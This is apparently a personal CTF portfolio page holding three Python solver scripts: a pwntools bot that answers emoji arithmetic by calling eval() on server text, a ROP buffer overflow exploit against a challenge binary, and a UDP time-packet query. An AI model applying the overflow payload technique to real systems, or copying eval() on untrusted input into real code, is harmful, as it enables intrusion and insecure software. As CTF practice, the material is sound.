---
#layout: default
---            
|<script src="https://tryhackme.com/badge/60599"></script> |<script src="https://www.hackthebox.eu/badge/277042"></script>|

[Hack the Box Write Ups](./htb.md)
[Try Hack Me Write Ups](./thm.md)

### What about emoji?

```py
#!/usr/bin/env python3

from pwn import *
import re

r = remote("46.101.22.121",30437)
r.recv()
r.sendline("1")
d = r.recv().decode()
e = r.recv().decode()
print(d)
print(e)

emojis = {
"🌞" : re.findall("🌞 -> (\d+)",d)[0],
"🍨" : re.findall("🍨 -> (\d+)",e)[0],
"❌" : re.findall("❌ -> (\d+)",e)[0],
"🍪" : re.findall("🍪 -> (\d+)",e)[0],
"🔥" : re.findall("🔥 -> (\d+)",e)[0],
"⛔" : re.findall("⛔ -> (\d+)",e)[0],
"🍧" : re.findall("🍧 -> (\d+)",e)[0],
"👺" : re.findall("👺 -> (\d+)",e)[0],
"👾" : re.findall("👾 -> (\d+)",e)[0],
"🦄" : re.findall("🦄 -> (\d+)",e)[0]
}

print(str(emojis))

r.sendline("2")

for i in range(1,501):
	ques = r.recv().decode()

	print(ques)

	equation = ''
	for c in ques:
		if c in emojis:
			equation = equation + ' ' + emojis[c]
		elif c in ['*','-','+','-']:
			equation = equation + ' ' + c

	res = eval(equation)
	print(res)
	r.sendline(str(res))

flag = r.recv().decode()

print(flag)
```
### What about BOF?

```py
#!/usr/bin/env python3
from pwn import *

#p = process('./easyrop')
p = remote('hsg1.superhero1.com', 9002)
e = ELF('./easyrop')

ckpt1 = p64(e.symbols.checkpoint1) # finds address
ckpt2 = p64(e.symbols.checkpoint2)
secret = p64(e.symbols.secret)
#print(ckpt1, ckpt2)

# start interaction
# padding 
padding = b'A' *0x68  # 96 + 8 
payload = padding
payload += ckpt1
payload += ckpt2
payload += secret

p.sendline(payload)
data = p.recvall()
print(data)
```

### What about NTP you ask?
```py
#!/usr/bin/env python3
import struct
import socket
import time
import datetime

#  lib8time.cityinthe.cloud port 2038
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Bind the socket to the port
server_address = ('lib8time.cityinthe.cloud', 2038)

# Calculate current time
t = int(time.time())

# Create the packet data
packet = struct.pack('>hiqq',4919,1,t,int((time.time() % 1)*1000000))

# Send packet and get response
sock.sendto(packet, server_address)
data, address = sock.recvfrom(4096)

# Unpack the response
r = struct.unpack('>hiqqqq',bytes(data))
print(r)

# Parse the response
ct_s = r[2]
st_s = r[4]
ct_m = r[3]
st_m = r[5]

# Parse the time and convert to readable format in UTC
client_time = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(ct_s))
server_time = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(st_s))
print("Client time now (UTC):{}".format(client_time))
print("Server time now (UTC):{}".format(server_time))

# Calcualte the difference in Hour
print("Hours difference: {}".format((st_s-ct_s)/3600))
```

<script src="https://platform.linkedin.com/badges/js/profile.js" async defer type="text/javascript"></script>
<div class="badge-base LI-profile-badge" data-locale="en_US" data-size="medium" data-theme="dark" data-type="VERTICAL" data-vanity="cyber-consultant" data-version="v1">
</div>
